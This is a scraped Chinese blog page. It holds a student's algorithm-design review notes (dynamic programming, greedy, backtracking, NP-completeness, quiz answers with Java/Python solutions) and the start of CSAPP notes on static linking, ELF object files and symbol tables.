放入物品𝑖则变为𝑚(𝑖+1,𝑗–𝑤𝑖)+𝑣𝑖，不放入物品𝑖则变为𝑚(𝑖+1,𝑗) 动态规划1 # 1️⃣令(𝑤,𝑣)表示当前背包的\u0026lt;重量,价值\u0026gt;\n放或不放物品1： ( 0 , 0 ) ( 5 , 3 ) 放或不放物品2： ( 0 , 0 ) ( 5 , 3 ) / ( 12 , 4 ) ( 17 , 7 ) 放或不放物品3： ( 0 , 0 ) ( 5 , 3 ) ( 12 , 4 ) ( 17 , 7 ) / ( 6 , 7 ) ( 11 , 10 ) ( 18 , 11 ) ( 23 , 14 ) 放或不放物品4： ( 0 , 0 ) ( 5 , 3 ) ( 12 , 4 ) ( 6 , 7 ) ( 11 , 10 ) / ( 7 , 9 ) ( 12 , 12 ) ( 19 , 13 ) ( 13 , 16 ) ( 18 , 19 ) 放或不放物品5：新增结点全部被支配，所以无任何变化 ( 0 , 0 ) ( 5 , 3 ) ( 6 , 7 ) ( 11 , 10 ) ( 7 , 9 ) ( 12 , 12 ) ( 13 , 16 ) ( 18 , 19 ) 2️⃣价值最大着(18,19)即为解，对应选择的物品是1/3/4\n⚠️注意每一轮需要删掉两种结点\n一个是总重量大于20的结点 另一个是被支配结点，比如结点𝐴的重量比别人大+价值还比别人小，则将其删掉 动态规划2 # 1️⃣第一问\n分放或者不放来更新会更加显然一些。\n放或不放物品1：(2,6) 不放：(0,0) 放入：(2,6) 放或不放物品2：(2,3) 不放：(0,0)(2,6) 放入：(2,3)(4,9)其中(2,3)被支配 放或不放物品3：(6,5) 不放：(0,0)(2,6)(4,9) 放入：(6,5)(8,11)(10,14)其中(6,5)被支配 放或不放物品4：(5,4) 不放：(0,0)(2,6)(4,9)(8,11)(10,14) 放入：(5,4)(7,10)(9,13)(13,15)(15,18)其中(5,4)被支配 放或不放物品5：(4,6) 不放：(0,0)(2,6)(4,9)(8,11)(10,14)(7,10)(9,13)(13,15)(15,18)其中(7,10)被支配 放入：(4,6)(6,12)(8,15)(12,17)(14,20)(11,16)(13,19)其中(4,6)被支配 2️⃣最优解源于(14,20)，选择的是1/2/3/5\n动态规划3 # 1️⃣对于数组𝐴，假设以𝐴[𝑖]结尾的子序列长度为𝐿[𝑖]\n对于介于0→𝑖之间的𝑗，如果𝐴[𝑖]\u0026gt;𝐴[𝑗]，则完全可以将𝐴[𝑖]加到以𝑗结尾的子序列当中 再与原有的𝐿[𝑖]值比较那个更大，也就是𝐿[𝑖]=max∀𝑗\u0026lt;𝑖𝐿[𝑗]+1,𝐿[𝑖] 如果𝐴[𝑖]\u0026lt;𝐴[𝑗]对所有的𝑗成立，则截至到𝐴[𝑗]的升序被打断，𝑖处最大升序只能为1即𝐿[𝑖]=1 2️⃣算法设计\n设长度𝐿[]=[1] 用𝑖遍历𝐴中每个元素 用𝑗遍历𝐴[0]到𝐴[𝑖]每个元素 如果𝐴[𝑖]\u0026gt;𝐴[𝑗]则𝐿[𝑖]=max𝐿[𝑗]+1,𝐿[𝑖] 输出𝐿[]中的最大值 动态规划4 # https://leetcode.cn/problems/maximum-product-subarray/\n1️⃣可能的连续子序列有𝐶𝑛22=𝑂(𝑛2)，计算乘的平均长度为𝑛2，所以复杂度为𝑂(𝑛3)或𝑂(𝑛2)(并行优化后)\n2️⃣分治法：\n将𝐴从𝐴[mid]处拆开 从𝐴[mid]往最右累乘，计算这一过程中的最大正数𝑅𝑃和最小负数𝑅𝑁 从𝐴[mid]往最左累乘，计算这一过程中的最大正数𝐿𝑃和最小负数𝐿𝑁 分别计算𝑅𝑃𝐿𝑃/𝑅𝑃𝐿𝑁/𝑅𝑁𝐿𝑃/𝑅𝑁𝐿𝑁，取其中最大值为𝑀 将左右两半边按照同样的方式递归处理 合并操作：假设每个结点的左/右半边最大乘积为max𝑙/max𝑟，则取maxmax𝑙,max𝑟,𝑀 复杂度：假设不论多少位的乘法都可以在𝑂(1)内并行完成，则𝑇(𝑛)=2𝑇(𝑛2)+𝑂(1) 说过很多遍了，由主方法可得复杂度为𝑂(𝑛) 3️⃣动态规划：\nM ( k )的递推：以下分析再加上𝐴[𝑘]自己，𝑀(𝑘)=max𝐴[𝑘],𝑀(𝑘–1)𝐴[𝑘],𝑚(𝑘–1)𝐴[𝑘]\nM ( k ) 潜在的最大：𝐴[𝑘]为负数时，𝑀(𝑘)=𝑚(𝑘–1)𝐴[𝑘] M ( k ) 潜在的最大：𝐴[𝑘]为正数时，𝑀(𝑘)=𝑀(𝑘–1)𝐴[𝑘] m ( k )的递推：以下分析再加上𝐴[𝑘]自己，𝑚(𝑘)=min𝐴[𝑘],𝑀(𝑘–1)𝐴[𝑘],𝑚(𝑘–1)𝐴[𝑘]\nm ( k ) 潜在的最小：𝐴[𝑘]为负数时，𝑚(𝑘)=𝑀(𝑘–1)𝐴[𝑘] m ( k ) 潜在的最小：𝐴[𝑘]为正数时，𝑚(𝑘)=𝑚(𝑘–1)𝐴[𝑘] 算法实现：复杂度为𝑂(𝑛)\n初始化𝑚[1]=𝐴[0]以及𝑀[1]=𝐴[0]\n用𝑖遍历整个𝐴数组\n按照递归式填补𝑚[𝑖]和𝑀[𝑖] 输出𝑀[𝑖]最大值\n代码如下，直接遍历以这个位置结尾的最大值和最小值。\nclass Solution { public int maxProduct(int[] nums) { int n = nums.length; int[] dpmin = new int[n]; int[] dpmax = new int[n]; dpmin[0] = nums[0]; dpmax[0] = nums[0]; int ans = nums[0]; for(int index = 1; index \u0026lt; n; ++index){ dpmax[index] = Math.max(nums[index], Math.max(dpmax[index - 1] * nums[index], dpmin[index - 1] * nums[index])); dpmin[index] = Math.min(nums[index], Math.min(dpmax[index - 1] * nums[index], dpmin[index - 1] * nums[index])); ans = Math.max(ans, dpmax[index]); } return ans; } } 动态规划5 # 1️⃣递推式：对𝑥[𝑖]有两种处理，即使用邮票𝑖或者不使用邮票𝑖\nfor (int i = 1; i \u0026lt; n; i++) { // 遍历物品 for(int j = 0; j \u0026lt;= bagWeight; j++) { // 遍历背包容量 if (j \u0026lt; weight[i]) dp[i][j] = dp[i - 1][j]; else dp[i][j] = max(dp[i - 1][j], dp[i][j - weight[i]] + value[i]); } } 如果不使用：也就是前𝑖–1张以最优结构凑出𝑗，所以𝑐[𝑖][𝑗]=𝑐[𝑖–1][𝑗] 如果使用：使用邮票𝑖后构成总邮资𝑗 01 背包问题：第𝑖张票不能再用了，也就是要前𝑖–1张邮票再构成总邮资𝑗–𝑥[𝑖] 完全背包问题：第𝑖张票有无限个还能再用，也就是要前𝑖张邮票再构成总邮资𝑗–𝑥[𝑖] 这里式完全背包问题，所以递归式为𝑐[𝑖][𝑗]=𝑐[𝑖][𝑗–𝑥[𝑖]]+1 合起来就是：𝑐[𝑖][𝑗]=min𝑐[𝑖–1][𝑗],𝑐[𝑖][𝑗–𝑥[𝑖]]+1 2️⃣初始条件：\nc [ 1 ] [ j ] ：要用第一种邮票构成邮资𝑗，由于𝑥[1]=1，所以𝑐[1][𝑗]=𝑗 c [ i ] [ 0 ] ：要用前𝑖种邮票构成邮资0，什么都不选就行了，所以𝑐[𝑖][0]=0 c [ i ] [ 1 ] ：要用前𝑖种邮票构成邮资1，显然就是选一个𝑥[1]就行了，所以𝑐[𝑖][1]=1 3️⃣四张邮票所以𝑖≤4，最大邮资为8所以𝑗≤8，不断代入递归式就行了\n动态规划6 # 1️⃣令𝑠𝑢𝑚[𝑖]为0→𝑖中子段最大和\ns u m [ i – 1 ]\n要么是正数/0\n为正：为𝑠𝑢𝑚[𝑖]做出正向的贡献，即𝑠𝑢𝑚[𝑖]=𝑠𝑢𝑚[𝑖–1]+𝑎[𝑖] 为负：为𝑠𝑢𝑚[𝑖]无贡献，即𝑠𝑢𝑚[𝑖]=𝑎[𝑖] 合起来就是：𝑠𝑢𝑚[𝑖]=max𝑠𝑢𝑚[𝑖–1]+𝑎[𝑖],𝑎[𝑖]\n3️⃣算法：加上负数抹成0的机制\ndef max_subarray_sum(a): if not a: return 0 dp = [0] * len(a) dp[0] = a[0] max_sum = max(dp[0], 0) for i in range(1, len(a)): dp[i] = max(dp[i-1] + a[i], a[i]) if dp[i] \u0026gt; max_sum: max_sum = dp[i] return max(max_sum, 0) 贪心算法1 # 很奇妙呢，就是直接分成很多的3。\n1️⃣这是一个严格的结论：令∀𝑛=3𝑚+r，其中𝑟=𝑛 mod 3\nr =0 是分解为3𝑚 r =1 是分解为3(𝑚–1)+2+2 r =2 是分解为3𝑚+2 2️⃣贪心选择性质：算法每一步的局部最优，会带来最终的全局最优\n首先证明分解数不超过4：假设某一个数分解出现了𝑘≥4，则乘积为𝑘×Rest 可以再将𝑘变成𝑘=2+(𝑘–2)，则乘积变为了2(𝑘–2)×Rest 2 ( k – 2 ) × Rest – k × Rest = ( k – 4 ) × Rest ≥ 0 ，所以消除𝑘能使得乘积更大 其次如果选择1也是不行的，比如𝑘×Rest≥1𝑘×Rest 所以最优情况必须是划为2或3的总和，接下来需要做的就是判断是以2为主还是以3为主 假设选择更多的2为最优，以6为例，＜23＜32所以不成立 所以应该分解为更多的3 余数的处理 余数为0，不处理 余数为1，出现了1就不是最优了，最优的做法是借一个3将其分为2+2 余数为2，不处理 贪心算法2 # 0️⃣概念理解\nX 被𝑌覆盖：也就是𝑋的每个子区间都必须被𝑌的某个子区间覆盖\n覆盖数：就是𝑌能覆盖𝑋后𝑌有多少子区间\n也就是中间可以有空的地方，这里要注意一下。\n注意有一个误区，就是𝑌必须是𝑋的子集，不然一个从头到尾的大区间就覆盖掉了，不论中间有没有空隙\n1️⃣贪心策略\n初始化：将𝑋中第一个区间放入𝑌，作为当前区间 更新：重复以下过程 如果当前区间与其他区间有交集 将选取右边界最大的有交集区间 将当前区间与右边界最大的区间进行合并加入到𝑌，形成新的当前区间 如果当前区间与其他区间没有交集 选取离当前区间距离最小的区间 将该区间加入到𝑌中，更新当前区间为该区间 2️⃣最优性证明：\n假设存在某个更优解，其必定在某一部需要选择一个右端点更小的区间 从而导致相比原有做法，后续需要更多区间覆盖，不是最优 所以矛盾，本方法最优 3️⃣复杂度：只需遍历一次，每个区间在每次遍历时只被处理一次，所以复杂度为𝑂(𝑛)\n贪心算法3 # https://leetcode.cn/problems/assign-cookies/description/\n1️⃣首先讲所有小孩/饼干按照饥饿度/饼干大小排序\n2️⃣用𝑖指针遍历小孩数组，用𝑗指针遍历饼干数组\n如果𝐶𝑖\u0026gt;𝐵𝑗，则执行𝑗++ 如果𝐶𝑖≤𝐵𝑗，则执行𝑗++/𝑖++/Count++ 3️⃣最终输出Count\nclass Solution { public int findContentChildren(int[] g, int[] s) { Arrays.sort(g); int kidsNumber = g.length; Arrays.sort(s); int cookiesNumber = s.length; int ans = 0; int i = 0; int j = 0; while(j \u0026lt; s.length \u0026amp;\u0026amp; i \u0026lt; g.length){ if(s[j] \u0026gt;= g[i]){ ++i; ++j; ++ans; }else{ ++j; } } return ans; } } 回溯法1 # 1️⃣解向量为𝑥1,𝑥2,\u0026hellip;,𝑥𝑛其中𝑥𝑖=0/1表示货物𝑖放/不放在船上，约束条件为𝑥𝑖∈0,1和∑𝑖=1𝑤𝑖𝑥𝑖≤𝑐\n2️⃣如下图，结点表示当前总重量，遇到结点\u0026gt;120的就剪枝\n回溯法2 # 0️⃣𝑛皇后问题：在𝑛×𝑛的棋盘上防止𝑛个皇后，所有的皇后不同行/不同列/不同对角线\n解向量：𝑥1,𝑥2,\u0026hellip;,𝑥𝑛其中𝑥𝑖表示棋子位于第𝑖行第𝑥𝑖列 显约束：𝑥𝑖∈1,2,\u0026hellip;,𝑛 隐约束：𝑥𝑖之间互不相等，不在同一对角线上|𝑥𝑖–𝑥𝑗|≠|𝑖–𝑗|，注意这个是所有对角线 1️⃣解空间树\n画个图来直接做剪枝的处理。\n回溯法3 # 1️⃣解向量为𝑥1,𝑥2,\u0026hellip;,𝑥𝑛，显性约束为𝑥𝑖=0,1，隐约束为∑𝑖=1𝑛𝑥𝑖𝑤𝑖=𝑚\n2️⃣解为：8+3\n回溯法4 # 1️⃣解向量为𝑥1,𝑥2,\u0026hellip;,𝑥𝑛\n显约束为𝑥𝑛=1,2,\u0026hellip;,𝑛且互相间不相同\n隐约束为在解向量中，当前在栈中的元素，必定排在已出栈元素的后面\n开始输出之后，就要一次性全部都输出出去。\n2️⃣123进栈后能输出的只有：123/132/213/321，完全倒推出解空间树\n回溯法5(递归回溯) # 0️⃣注意这个问题进行的是深度优先搜索，即递归回溯，具体的图我就不画了\n1️⃣算法思路：假设有𝑛个结点时\n初始化当前最优为1→2→3→4→5→1的距离，以便快速收敛 回溯函数：用𝑖遍历树的每层： 当𝑖\u0026lt;𝑛时，尝试将其与除结点𝑖外的下一层结点进行连接，如果从根到下一节点路径长于最优，则剪枝 当𝑖=𝑛时，尝试与起始点进行连接，如果能与起始点连接则计算哈密顿路径，更小则更新最优值 输出最终的最优值 0 NP1 # ​\t**(稠密子图问题DEN-SG)**给定无向图G，判定G中是否存在一个子图H，它有k个顶点，且至少有y条边。已知k团问题CLIQUE是NP完全问题，请证明稠密子图问题DEN-SG是NP完全问题。\n1️⃣两个问题分别是什么\n稠密子图问题：给定无向图𝐺，要寻找它的一个包含𝑘个顶点的子图，并且该子图边数大于等于𝑦 团问题：给定无向图𝐺，要寻找它的一个包含𝑘个顶点的子图，并且该子图结点互相两两连接 2️⃣先证明稠密子图NP，即它可在多项式时间内验证\n遍历子图所有顶点，并计算其边数，即可判断其总边数是否大于𝑦 耗𝑂(𝑘2)，所以是NP问题 3️⃣证明团问题可以线性时间内规约到稠密子图问题\n很显然的直接推理就可以。\n构建团问题的实例(𝐺,𝑘)：图𝐺中存在𝑘个结点两两连接的子图，则子图中边数为𝑘(𝑘−1)2 构建稠密子图问题的实例(𝐺,𝑘,𝑘(𝑘−1)2) 当团实例成立时，该稠密子图实例也成立，故团问题在多项式时间内规约到了稠密子图问题，证毕 NP2 # 证明顶点覆盖问题（Vertex Cover Problem）属于NPC类\n1️⃣两个问题分别是什么\n顶点覆盖问题：给定无向图𝐺，要寻找它的一个包含𝑘个顶点的子图，子图所有点能连接到图中所有边 团问题：给定无向图𝐺，要寻找它的一个包含𝑘个顶点的子图，并且该子图结点互相两两连接 2️⃣证明顶点覆盖问题是NP：也就是可在所想是时间内验证\n遍历子图中每一个点，记录每一点所连接的边，最后看这些边是否覆盖了所有边 时间复杂度𝑂(𝑘2) 3️⃣证明团问题可以线性时间内规约到顶点覆盖问题\n构建一个团问题的实例(𝐺,𝑘)：图𝐺中存在𝑘个结点两两连接的子图 构建覆盖问题实例(𝐺,|𝐺|−𝑘) 由于定理可知，当团问题实例成立时，覆盖问题实例也一定成立，证毕 NP3 # 1️⃣证明子集覆盖时NP的：遍历𝐶中每一子集，从左到右依次合并，将最终结果与𝑋对比，即可在𝑂(𝑛)内验证\n2️⃣证明顶点覆盖问题可在多项式时间内规约到子集覆盖问题\n核心的思路就是，全集为所有边，一个点关联的所有边为一个子集\n子图中点的边全覆盖了所有边，变成了子图中点对应的边的子集覆盖了全集\nNP4 # 👉𝑃问题：可在多项式时间内求解\n👉𝑁𝑃问题：可在多项式时间内验证，但无法求解\n👉𝑁𝑃𝐶问题：最难的𝑁𝑃问题\n👉𝑁𝑃难问题：难度比𝑁𝑃𝐶还要难的问题，但不一定是𝑁𝑃问题\n1️⃣分别对/错/错，见上图\n(判断)若问题A是一个P类问题，则A也是一个NP类问题 (判断)所有NP难问题都是NP问题 (判断)若问题A是一个NP问题，则A也是一P类问题\n​\n➡️由上图可知，选D\n2️⃣不对，不是上界是下界\n注意：在A归约B的情况下，到A的下界推出B的下界（相减），B的上界推出A的上界（相加）。\n(判断)若问题A的计算时间上界为O(𝑛2)，且问题A可在O(n)时间内变换为问题B，则问题B的计算时间上界也O(𝑛2)\n记住NP问题规约的一些结论：若𝐴可在𝑂(𝜏(𝑛))时间内变换到𝐵，即𝐴∝𝜏(𝑛)𝐵 显然凭直觉有𝑇𝐴=𝑂(𝜏(𝑛))+𝑇𝐵 则𝑇𝐴−𝑂(𝜏(𝑛))为𝐵的下界 则𝑇𝐵+𝑂(𝜏(𝑛))为𝐴的上界 ➡️由以上结论可得选𝐷\n3️⃣选𝐵要记住，如果𝐴是𝑁𝑃𝐶+𝐵是𝑁𝑃+𝐴线性时间可转化为𝐵，则𝐵是𝑁𝑃𝐶\n算法导论 # 1️⃣不对，程序可以无限执行，比如系统进程\n(判断)算法和程序都必须满足有限性，即在执行有限时间后结束 2️⃣两个都对\n(判断)若f(n)=O(g(n))，且f(n)=Ω(g(n))，则f(n)=Θ(g(n)) (判断)若f(n)=Θ(g(n))，则f(n)=Ω(g(n)) f ( n ) = O ( g ( n ) ) 即𝑓(𝑛)≤𝑐1𝑔(𝑛)，𝑓(𝑛)=Ω(𝑔(𝑛))即𝑓(𝑛)≥𝑐2𝑔(𝑛)，于是𝑐2𝑔(𝑛)≤𝑓(𝑛)≤𝑐1𝑔(𝑛)这就是𝛩(𝑔(𝑛))的定义 Θ ( g ( n ) ) 即𝑐2𝑔(𝑛)≤𝑓(𝑛)≤𝑐1𝑔(𝑛)，于是𝑐2𝑔(𝑛)≤𝑓(𝑛)这就是Ω(𝑔(𝑛))的定义 3️⃣就是说𝑓的增长要快于𝑔，所以是大于等于，也就是不小于，选𝐵\n➡️即𝑓(𝑛)≤𝑐𝑔(𝑛)，说明𝑔(𝑛)增长更快，所以𝑓(𝑛)阶更小(小于等于)，选𝐴\n➡️最好情况是紧的𝑐𝑓(𝑛)，所以平均情况肯定要高于𝑐𝑓(𝑛)，也就是以𝑐𝑓(𝑛)为下界，也就是Ω(𝑓(𝑛))选B\n4️⃣(7×2𝑛)×2=7×2𝑛′所以𝑛′=𝑛+1选𝐴\n➡️错误，归并排序又不是𝑂(𝑛)的\n如果一个归并排序算法在某台机器上用1秒钟排序5000个记录，则用2秒钟可以排序10000个记录 递归分治 # 1️⃣不对，直接间接调用，一个不能少\n(判断)递归算法就是指一个直接调用自身的算法。 ​\n2️⃣对的，不断将问题分治为更小的规模\n(判断)二分法搜索算法是运用了分治策略设计的。 ​\n3️⃣不对，也可以分治后，循环遍历处理每个子问题\n分治必须用递归实现 ​\n4️⃣由主定理可知𝑛log𝑏⁡𝑎=𝑛，属于情况1，所以为Θ(𝑛log𝑏⁡𝑎)=Θ(𝑛)，选𝐵\n主定理：𝑇(𝑛)=𝑎𝑇(𝑛𝑏)+𝑓(𝑛)，则𝑇(𝑛)有如下渐进界\n条件 结论 f ( n ) 的增长慢于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( n log b ⁡ a ) f ( n ) 的增长等于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( n log b ⁡ a log ⁡ n ) f ( n ) 的增长快于𝑛log𝑏⁡𝑎 T ( n ) = Θ ( f ( n ) ) ➡️采用的分治法，一分为二，左右两边都要处理，所以𝑇(𝑛)=2𝑇(𝑛2)+𝑐，所以是Θ(𝑛)\n5️⃣分别是：分治，贪心( Dijkstra )，动态规划，贪心。所以选A\n贪心 # 1️⃣非01背包就是要价值/背包中总重最大，所以也一定是贪心地做出最有利于增大这一比例的选择\n但是注意这里的非01背包问题，区别于01背包问题，可以将每个物品分割后放入 2️⃣选𝐶，每次贪心地选择一行内总和最小的两个数\n3️⃣贪心( Dijkstra )，因为每次都选离当前结点最近的点\n4️⃣都对，详见下\n(判断)在求最小生成树的算法中， Kruskal算法使用的是贪心策略 (判断)求最小生成树的Prim算法使用的设计策略是贪心策略 ​\nKruskal ：边扩展，操作对象为所有边，选择权重最小的边加入生成树中 Prim ：点扩展，操作对象为与当前生成树连接的边，选择权重最小边的点加入生成树中 DP # 1️⃣不对，动态规划适用于解决最优子结构+重叠子问题的确定性问题\n(判断)动态规划适合求解动态不确定性问题。 ​\n2️⃣对的，这是定义\n(判断)最优子结构性质是指问题的最优解包含了子问题的最优解。 ​\n3️⃣选𝐵，这是定义\n4️⃣不对，详见下表\n(判断)动态规划算法与分治法都采用自底向上的计算方式 ​\n特性 动态规划 分治法 分解方式 子问题可能重叠 子问题相互独立 计算方向 自底向上 自顶向下 是否存储子问题解 需要存储子问题解以避免重复计算 不需要存储子问题解 回溯算法 # 1️⃣正确：区别见下\n(判断)回溯法和分支限界法都是在问题解空间树上搜索问题解的算法 ​\n搜索策略不同：回溯法通常采用深度优先搜索，而分支限界法通常采用广度优先或最小耗费优先搜索 剪枝方式不同：回溯法主要依赖约束条件，而分支限界法依赖限界函数 2️⃣选𝐴，基本概念\n3️⃣选𝐶，回溯法是用约束条件剪去不满足约束的点及其子树，分支界限使用限界函数减去得不到最优解的子树\n4️⃣最坏情况要遍历所有的叶节点，有多少种排列就有几个叶节点，排列数为𝑛!，所以复杂度为𝑂(𝑛!)\n分支限界 # 1️⃣选𝐷，我们上面之前讲得比较清楚了\n2️⃣选𝐵，分析见下\n首先了解这三个概念 活结点：本身已生成，子节点还未全部生成 扩展结点：正在生成子节点 死结点：子节点全部生成完毕 回溯法：深度优先 比如当前结点有多个子节点，当前生成了一个结点后，先往深处搜索 搜索到底部了之后，再回溯过来生成下一个子节点 所有有多次机会 分支界限法：广度优先，一次性一股脑生成所有子节点，所以只有一次机会 3️⃣对的，结点选择方法，比如栈式分支/队列式分支/优先对列分支，会影响搜索的路径和效率\n(判断)扩展节点的选择影响分支限界法 ​\n4️⃣不对，二者的根本差别不在用不用栈，而在深度优先和广度优先搜索，还有剪枝规则\n(判断)在分支限界法中，如果将活结点用栈来存储，则这种分支界限法就是回溯法 概念题目 # 1️⃣写出分治、动态规划、贪心、回溯算法的策略\n分治：自上而下地将一个复杂问题分为若干简单可直接求解的子问题，通过子问题的解得到原有问题的解 动态规划：将原问题分为互相重叠的子问题，分别解决子问题最终自下而上地合并为原问题的解 贪心：每一步都采取当前状态下最好的选择，从而导致全局都是最优的 回溯：在问题的解空间树上深度优先搜索问题的解，并在不满足约束条件时进行剪枝回退 2️⃣什么是算法的复杂性？ 什么是算法的渐进复杂性？\n复杂性：算法运行所需要的所有计算资源 渐进复杂度：算法规模趋近于穷时，算法的复杂性所趋近的值 3️⃣在回溯法中， 什么是约束函数和界限函数？ 它们在搜索过程中的作用是什么？\n约束函数：用于检测是否满足约束条件，用于在回溯法中剪去不满足约束条件的结点及其子树 界限函数：用于计算当前结点是否能达到最优，用于剪去不能达到最优的结点及其子树 4️⃣什么是最优子结构？ 请举例说明。\n最优子结构：当一个问题的最优解包含其所有子问题的最优解时，称之为具有最优子结构 比如：Dijkstra问题中最短路径就具有最优子结构 5️⃣线性时间选择算法：找到第𝑘小的数\n将输入数组按5个一组划分，每组内元素进行排序，选出每组中位数组成一个新的数组 对新数组再进行相同操作，得到中位数的中位数，作为数组的Pivot划分数组 确定第𝑘小的数在数组那一部分，然后递归地处理呢一部分 6️⃣什么是算法？算法应满足的标准是什么？\n算法：解决问题的方法和过程，有穷操作和指令的集合 标准：确定性，有穷性，可行性，健壮性 ","date":"11 May 2025","externalUrl":null,"permalink":"/notes/algorithmdesign/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e算法设计与分析 \n    \u003cdiv id=\"%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e1.课太蠢，简单写一点复习笔记\u003c/p\u003e\n\u003cp\u003e2.大量的数学笔记都是我复制下来的，我没有手打这么多公式的耐心，只能感谢那名陌生的同学了,原来的仓库https://github.com/DANNHIROAKI/XJTU-CS-Courses/tree/master,可能这篇文章的阅读体验相对会更好一点，因为数学公式会直接渲染并且我会多余做一些补充和更改，如果原作者看到并且觉得这样不好，您可以直接联系我删除。\u003c/p\u003e\n\u003cp\u003e3.代码就会按照原书中来的，利用\u003cstrong\u003eJava\u003c/strong\u003e来实现。\u003c/p\u003e\n\u003cp\u003e4.\u003ca href=\"https://csdiy.wiki/%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84%e4%b8%8e%e7%ae%97%e6%b3%95/CS170/\" target=\"_blank\"\u003ehttps://csdiy.wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/CS170/\u003c/a\u003e 笔者非常后悔在学校老师狂念PPT的时候没有自学这个CS170,如果你还有机会，一定要看一看。\u003c/p\u003e","title":"AlgorithmDesign","type":"notes"},{"content":"","date":"22 April 2025","externalUrl":null,"permalink":"/thinking/%E8%B0%88%E8%B0%88%E9%B8%A1%E6%B1%A4/","section":"Thinking","summary":"","title":"谈谈鸡汤","type":"thinking"},{"content":" \u0026ldquo;I am not afraid of failing. I am afraid of succeeding in things that don\u0026rsquo;t matter.\u0026rdquo;\n\u0026mdash;William Carey\n这里就是一些杂谈，随便分享什么什么学习生活，旅游啊之类的经验。\n","date":"19 April 2025","externalUrl":null,"permalink":"/life/","section":"Life","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003e\u0026ldquo;I am not afraid of failing. I am afraid of succeeding in things that don\u0026rsquo;t matter.\u0026rdquo;\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u0026mdash;\u003cstrong\u003e\u003ca href=\"https://en.wikipedia.org/wiki/William_Carey_%28missionary%29\" target=\"_blank\"\u003eWilliam Carey\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e这里就是一些杂谈，随便分享什么什么学习生活，旅游啊之类的经验。\u003c/p\u003e","title":"Life","type":"life"},{"content":" “勿以浮沙筑高塔。”\n","date":"19 April 2025","externalUrl":null,"permalink":"/csapp/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e“勿以浮沙筑高塔。”\u003c/p\u003e\u003c/blockquote\u003e","title":"","type":"csapp"},{"content":" CSAPP:LinkerLab # CSAPP上关于链接的知识我也会放在这里\u0026hellip;\u0026hellip;\n本文图片大多来源于英文原版CSAPP。\n链接机制详解 # 有多详细？这很难定义吧，是否详细应当取决于读者本来的理解,linking本身就是看起来好像就是打包一下很简单的东西，但是涉及到的知识比较复杂，应用也相当广泛。\n编译器驱动程序 # 一个静态链接过程：\n静态链接 # LD 静态链接器 输入.o文件 输出一个可执行文件\n1.符号的解析\n2.重新定位\n目标文件 # 1.可重定位\n2.可执行\n3.共享（可以动态加载进入内存并且link）\n可重定位目标文件 # 很多人开始区分不清楚.o和elf：elf就是一种格式\nELF 全称是 Executable and Linkable Format（可执行与可链接格式）\n是 Linux 系统中常用的目标文件格式（Windows 上用的是 PE 格式）\n一个 ELF 文件可以是：\n可重定位目标文件（Relocatable Object File） → .o 文件 可执行文件（Executable File） → 如通过链接生成的可执行程序 共享库文件（Shared Object File） → .so 文件 核心转储文件（Core Dump） → 程序崩溃时生成的调试文件 .o 文件是用编译器（如 gcc -c）从 .c 文件生成的\n.o 文件的格式就是 ELF 格式的“可重定位目标文件”\n它通常还不包含主函数（main()），不能直接运行，需要链接成可执行文件\n一个典型的格式如下：\n.text:机器代码\n.rodata:只读data\n.data:全局静态变量\n.bss:未初始化或者初始化为0的全局静态(better save space(?))\n.symtab:符号表，函数和全局变量的信息\n符号和符号表 # 每个可重定位模块m都有一个符号表\n1.全局符号 我定义的非静态C函数和全局变量。\n2.外部符号 别人定义的非静态C函数和全局变量。\n3.局部符号 我的static函数和全局变量（.symtab不关心这些东西）,直接在stack中管理。\n所以，在C语言多文件编程中，用static保护好自己的函数和变量是好的习惯。\n符号表条目：\n每个字段都被分配到目标文件的某个section\n用 readelf 查看目标文件内容\n选项 含义 -h 查看 ELF 文件头（Header） -S 查看段表（Section Headers） -s 查看符号表（Symbol Table） -r 查看重定位信息（Relocation Info） -l 查看程序头表（Program Header） -x \u0026lt;section\u0026gt; 以十六进制查看某个段的内容 -a 查看所有信息（等价于所有选项的合集） main.c\nint sum(int *a, int n); int array[2] = {1, 2}; int main() { int val = sum(array, 2); return val; } sum.c\nint sum(int *a, int n) { int i, s = 0; for (i = 0; i \u0026lt; n; i++) { s += a[i]; } return s; } $readelf -s main.o Symbol table \u0026#39;.symtab\u0026#39; contains 6 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS main.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 .text 3: 0000000000000000 8 OBJECT GLOBAL DEFAULT 3 array 4: 0000000000000000 40 FUNC GLOBAL DEFAULT 1 main 5: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND sum 有点懵，务必做课后练习题进一步理解。\n符号解析 # 链接器是怎样工作的？\n对于每个输入的文件的符号表进行扫描。\n多重定义的全局符号？ # 全局\u0026mdash;》强 弱\n强符号：函数 已经初始化的全局变量\n弱符号：未初始化的全局变量\n规则：\n1.强不能重名\n2.一强多弱选强符号\n3.多个弱符号随机选择（2,3都是比较危险的情况）\n是比较好理解的部分。\n与静态库的链接？ # 